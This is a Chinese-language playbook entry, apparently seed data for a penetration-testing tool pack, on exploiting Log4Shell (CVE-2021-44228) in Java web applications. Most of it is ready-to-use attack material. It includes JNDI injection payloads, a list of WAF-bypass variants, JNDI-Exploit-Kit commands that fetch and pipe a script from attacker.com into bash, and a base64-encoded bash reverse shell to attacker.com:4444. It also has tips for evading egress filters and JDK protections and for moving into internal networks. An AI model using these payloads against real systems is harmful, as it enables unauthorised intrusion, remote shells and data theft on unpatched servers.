# [种子] Log4Shell（CVE-2021-44228）JNDI 注入打 RCE

## 场景分类
渗透测试 / Web RCE

## 目标概述
某 Java Web 应用使用受影响版本的 Log4j2（< 2.17.0），任何用户可控字段被 log 时即触发 JNDI 远程加载，构造 LDAP/RMI 服务推送恶意类拿到目标机执行权限。

## 完整执行链路

1. 目标识别
   - HTTP 头 `Server`、`X-Powered-By` 含 Java 应用框架（Tomcat/Spring/Liferay）
   - 版本指纹：登录页、404 页、路径泄露
   - 漏洞确认：通过任意可被记入日志的字段（User-Agent、Referer、X-Forwarded-For、登录用户名、搜索框）发探测 payload
2. 准备 OOB 监听
   - DNSLog 平台（dnslog.cn / interactsh / Burp Collaborator）
   - 自建 LDAP 服务（marshalsec / JNDI-Exploit-Kit）
3. 探测有无漏洞
   ```
   ${jndi:ldap://abc123.dnslog.cn/x}
   ```
   插入到 User-Agent 等字段，DNSLog 平台收到 `abc123.dnslog.cn` 解析记录即确认
4. 起利用服务（自建公网 VPS 或 ngrok 反代）
   ```bash
   java -jar JNDI-Exploit-Kit.jar -L 0.0.0.0:1389 -P 0.0.0.0:8888 -C 'curl http://attacker.com/sh|bash'
   ```
5. 触发利用 payload
   ```
   ${jndi:ldap://attacker.com:1389/Basic/Command/base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NofGJhc2g=}
   ```
6. 拿到 reverse shell → 后续提权 / 持久化按 attack-chain 走

## 踩坑记录

| 问题 | 原因 | 解决方案 | 耗时 |
|------|------|---------|------|
| 探测 payload 无 DNS 回连 | 目标在内网无外网 | 用 oast.online 等 DNS-only OOB，或测内部 DNSLog | 1h |
| DNS 解析了但 LDAP 不通 | 出网策略只放 DNS | 改用 DNS Exfiltration 直接外带数据，不走 LDAP | 1.5h |
| LDAP 通了但目标不加载 class | JDK 高版本（8u191+/11.0.1+/...）默认 `com.sun.jndi.ldap.object.trustURLCodebase=false` | 改用 `Tomcat` / `Groovy` / `BeanFactory` 等本地 gadget chain（无需远程类加载） | 3h |
| 双引号被转义 / payload 被 WAF 拦 | 各种 ${} 嵌套绕过现成的规则 | 用 `${${::-j}ndi:...}` / `${${lower:j}ndi:...}` / `${env:xx:-jndi}` 嵌套绕过 | 1h |
| 漏洞触发但拿不到 shell | 命令含特殊字符在 Runtime.exec 被破坏 | 用 base64 编码包一层：`bash -c {echo,base64}|{base64,-d}|bash` | 30min |
| Spring Boot 应用没复现 | Spring 用 Logback 不用 Log4j2 | 排查 dependency tree 看是否引入 spring-boot-starter-log4j2 | 20min |

## 工具链发现

- **JNDI-Exploit-Kit**（welk1n / pimps）一键起 LDAP+RMI+HTTP，支持本地 gadget bypass
- **JNDI-Injection-Exploit** 老版本，支持的 gadget 更全但已停更
- **Nuclei** 模板 `cves/2021/CVE-2021-44228.yaml` 适合扫资产是否受影响
- **interactsh-client** ProjectDiscovery 出品，自建 OOB 比 dnslog.cn 更隐私
- **CrowdStrike CVE-2021-44228 scanner** 在二进制级别检测 JndiLookup.class

## 关键代码/命令

WAF 绕过 payload 集合：

```text
${jndi:ldap://x.dnslog.cn/a}                    # 基础
${${::-j}ndi:ldap://x.dnslog.cn/a}              # 嵌套
${${lower:j}ndi:ldap://x.dnslog.cn/a}           # lower
${${upper:j}ndi:ldap://x.dnslog.cn/a}           # upper
${${env:NaN:-j}ndi:ldap://x.dnslog.cn/a}        # env fallback
${jndi:${lower:l}${lower:d}a${lower:p}://...}   # 极致拆字
${jndi:dns://x.dnslog.cn}                       # DNS 通道
${jndi:rmi://attacker.com:1099/a}               # RMI 替代 LDAP
```

interactsh 起服务：

```bash
interactsh-client -v
# 输出：abc123.oast.online ← 用这个域名替换 payload 里的 dnslog
```

JNDI-Exploit-Kit 一键利用：

```bash
java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar \
  -L attacker.com:1389 \
  -P attacker.com:8888 \
  -C 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx}|{base64,-d}|bash'
# 输出多条可用 payload，挑一条插到目标
```

## 对本包的改进建议

- `pentest-tools/references/log4shell-bypass-payloads.md` 单独建档，把 50+ 绕过 payload 集中
- nuclei 模板已自带 → 提醒用户 `nuclei -t cves/2021/CVE-2021-44228.yaml -l targets.txt`
- attack-chain 增加"通过 Log4Shell 进入内网后"的标准动作清单

## 可复用的模式/脚本片段

**Log4Shell 探测三段法**：

```text
1. 多字段批量发 ${jndi:ldap://oob/a} → 看 OOB 平台有无回连
2. 有回连 → 起本地 gadget LDAP（不依赖远程类加载）→ 推 payload
3. 无回连 → 切 DNS 通道做带外数据外带
```

**关键判断**：

```text
- DNSLog 收到回连但 LDAP 不通 → JDK 高版本，必走本地 gadget
- DNS 都不通 → 内网 OOB / 二阶反射（先打能出网的二级系统）
- 命令带特殊字符不响应 → base64 包装
```

## 进化动作
- [x] 路由矩阵已有 "Log4j" / "JNDI 注入" 关键词
- [ ] 单独建 log4shell-bypass-payloads.md
- [ ] bootstrap manifest 加入 interactsh-client

## 环境信息
- 攻击机: Kali，Java 8（运行 LDAP 服务）
- OOB 平台: dnslog.cn / oast.online / 自建 interactsh
- 目标: 任何 Log4j2 < 2.17.0 的 Java Web

## 脱敏要求
本条目为种子数据，基于公开 CVE 信息编写，不涉及真实生产目标。所有域名/IP 为占位示例。
